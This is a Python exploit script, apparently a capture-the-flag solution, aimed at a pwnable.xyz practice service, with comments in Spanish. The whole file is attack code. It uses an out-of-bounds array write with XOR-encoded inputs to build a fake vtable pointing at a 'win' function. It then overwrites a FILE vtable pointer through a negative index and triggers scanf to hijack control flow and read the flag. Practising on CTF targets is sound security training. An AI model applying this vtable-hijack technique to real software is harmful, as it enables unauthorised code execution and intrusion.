#!/usr/bin/env python3
import socket
import time
import sys

host = "svc.pwnable.xyz"
port = 30029

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(30)
s.connect((host, port))

banner = s.recv(1024)
print(banner.decode())

win = 0xa21
result_base = 0x202200

# Nueva idea: quizás glibc en el servidor es VIEJO y no tiene vtable checks
# O la vtable check solo verifica que esté en cierto rango

# Voy a crear UNA fake vtable MUY simple
# y luego sobrescribir la vtable

print("Creando fake vtable simple en result[]...")

# En result[1-9], pon todos = win
for i in range(1, 10):
    b = i
    a = win ^ b  
    s.sendall(f"{a} {b} {i}\n".encode())
    time.sleep(0.03)

# Limpiar buffer
time.sleep(0.5)
try:
    s.recv(8192, socket.MSG_DONTWAIT)
except:
    pass

# Ahora sobrescribir vtable apuntando a result[1]
fake_vtable = result_base + 8  # result[1]

print(f"\nSobrescribiendo vtable con {hex(fake_vtable)}...")
b = 1
a = fake_vtable ^ b
s.sendall(f"{a} {b} -5\n".encode())

time.sleep(0.5)
try:
    s.recv(2048, socket.MSG_DONTWAIT)
except:
    pass

# OK ahora el momento crítico
# Al enviar el siguiente input, scanf debería usar nuestra vtable
print("\nEnviando trigger...")

# Antes de enviar, preparar para capturar TODO
import select

s.setblocking(False)

try:
    s.sendall(b"5 10 2\n")
    print("Enviado")
except:
    print("Error al enviar")

# Capturar TODO durante 15 segundos
print("Capturando output...")
start = time.time()
all_data = b""

while time.time() - start < 15:
    ready = select.select([s], [], [], 0.2)
    if ready[0]:
        try:
            chunk = s.recv(8192)
            if chunk:
                all_data += chunk
                sys.stdout.write(chunk.decode())
                sys.stdout.flush()
            else:
                break
        except:
            break

print(f"\n\n{'='*60}")
if all_data:
    print("RECIBIDO:")
    print(all_data.decode())
    
    if b"flag{" in all_data.lower() or b"FLAG{" in all_data or b"pwn{" in all_data:
        print("\n*** FLAG ENCONTRADA ***")
else:
    print("(nada recibido)")
print('='*60)

s.close()